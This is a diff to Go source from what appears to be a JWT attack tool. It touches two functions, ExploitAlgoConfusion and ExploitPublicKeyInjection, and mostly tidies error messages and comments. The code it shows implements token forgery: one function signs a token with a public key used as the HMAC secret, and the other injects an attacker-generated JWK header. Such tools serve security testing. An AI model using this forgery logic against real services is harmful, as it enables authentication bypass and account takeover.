@@ -80,20 +80,14 @@ func ExploitAlgoConfusion(token *jwt.Token, algorithm string, publicKeyFile stri
 	}
 
 	//Get the public key from the file
-	// secret, err := ctrl.GetSecretFromPem(publicKeyFile)
-	// if err != nil {
-	// 	fmt.Printf("%v \n", err)
-	// 	return ""
-	// }
-
 	content, err := os.ReadFile(publicKeyFile)
 	if err != nil {
 		fmt.Printf("%v \n", err)
 		return ""
 	}
 
+	//Sign the token with the public key (remove potentials "\r" beforehand)
 	strToken, err := cpyToken.SignedString([]byte(strings.ReplaceAll(string(content), "\r", "")))
-
 	if err != nil {
 		fmt.Printf("%v \n", err)
 		return ""
@@ -122,14 +116,14 @@ func ExploitPublicKeyInjection(token *jwt.Token, algorithm string) string {
 	//Generate public/private keys
 	publicKey, privateKey, err := ctrl.GenerateKeys(algorithm)
 	if err != nil {
-		fmt.Printf("%v\n", err)
+		fmt.Printf("%v \n", err)
 		return ""
 	}
 
 	//Generate JWK using the public key
 	jwkValue, err := ctrl.GenerateJWK(publicKey, algorithm)
 	if err != nil {
-		fmt.Printf("%v\n", err)
+		fmt.Printf("%v \n", err)
 		return ""
 	}
 
@@ -137,7 +131,7 @@ func ExploitPublicKeyInjection(token *jwt.Token, algorithm string) string {
 	var jwkMap map[string]any
 	err = json.Unmarshal(jwkValue, &jwkMap)
 	if err != nil {
-		fmt.Printf("failed to unmarshal jwkValue: %v", err)
+		fmt.Printf("%v \n", err)
 		return ""
 	}
 	cpyToken.Header["jwk"] = jwkMap
@@ -152,7 +146,7 @@ func ExploitPublicKeyInjection(token *jwt.Token, algorithm string) string {
 	//Sign the token with the private key
 	strToken, err := cpyToken.SignedString(privateKey)
 	if err != nil {
-		fmt.Printf("An error ocurred while signing the token : %v \n", err)
+		fmt.Printf("%v \n", err)
 		return ""
 	}
 
